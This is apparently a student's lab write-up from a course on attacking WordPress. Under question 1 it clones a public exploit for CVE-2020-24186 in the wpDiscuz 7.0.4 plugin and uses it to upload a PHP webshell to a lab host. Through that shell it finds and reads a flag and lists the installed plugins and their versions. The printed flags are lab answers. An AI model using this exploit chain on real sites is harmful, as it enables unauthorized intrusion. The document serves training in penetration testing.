# Section 03: WordPress - Discovery & Emuneration

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Enumerate the host and find a flag.txt flag in an accessible directory.

Context:
- I know that the website used a plugin `wpDiscuz 7.0.4`, which is vulnerable to RCE, searching online found the `CVE-2020-24186` and the [POC](https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE), use that to exploit the web:
```bash
┌─[eu-academy-2]─[10.10.14.46]─[htb-ac-2162140@htb-vr5hvmsz1d-htb-cloud-com]─[~/EyeWitness]
└──╼ [★]$ git clone https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE
Cloning into 'CVE-2020-24186-wpDiscuz-7.0.4-RCE'...
remote: Enumerating objects: 34, done.
remote: Counting objects: 100% (34/34), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 34 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (34/34), 154.43 KiB | 11.03 MiB/s, done.
Resolving deltas: 100% (4/4), done.
┌─[eu-academy-2]─[10.10.14.46]─[htb-ac-2162140@htb-vr5hvmsz1d-htb-cloud-com]─[~/EyeWitness]
└──╼ [★]$ cd CVE-2020-24186-wpDiscuz-7.0.4-RCE/
┌─[eu-academy-2]─[10.10.14.46]─[htb-ac-2162140@htb-vr5hvmsz1d-htb-cloud-com]─[~/EyeWitness/CVE-2020-24186-wpDiscuz-7.0.4-RCE]
└──╼ [★]$ sudo python3 wpDiscuz_RemoteCodeExec.py -u http://blog.inlanefreight.local -p /?p=1 
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[105764] | code:[200]
[!] Got wmuSecurity value: c6490cf676
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: zkytpbmuwpbjwmx

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:http://blog.inlanefreight.local/wp-content/uploads/2026/09/zkytpbmuwpbjwmx-1789522996.6842.php 

> ls


zkytpbmuwpbjwmx-1789522996.6842.php
␦
> find / -type f -name "flag.txt" 2>/dev/null


/var/www/blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt
␦
> cat /var/www/blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt


0ptions_ind3xeS_ftw!
␦
> 
```

**Answer:** `0ptions_ind3xeS_ftw!`

---

### 2. Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).

Context:
- Use the shell to get the list of plugins right in the source code:
```bash
> ls /var/www/blog.inlanefreight.local/wp-content/plugins


akismet
contact-form-7
hello.php
index.php
mail-masta
mailchimp-for-wp
wp-sitemap-page
wpdiscuz
```
- Found 2 plugins with 3 words: `Mailchimp for WordPress` and `WP Sitemap Page`, the `WP Sitemap Page` is the answer

**Answer:** `WP Sitemap Page`

---

### 3. Find the version number of this plugin. (i.e., 4.5.2)

Context:
```bash
> head /var/www/blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/wp-sitemap-page.php


<?php
/**
Plugin Name: WP Sitemap Page
Plugin URI: http://tonyarchambeau.com/
Description: Add a sitemap on any page/post using the simple shortcode [wp_sitemap_page]
Version: 1.6.4
Author: Tony Archambeau
Author URI: http://tonyarchambeau.com/
Text Domain: wp-sitemap-page
Domain Path: /languages
```

**Answer:** `1.6.4`

---

[Back to Module Index](./README.md)
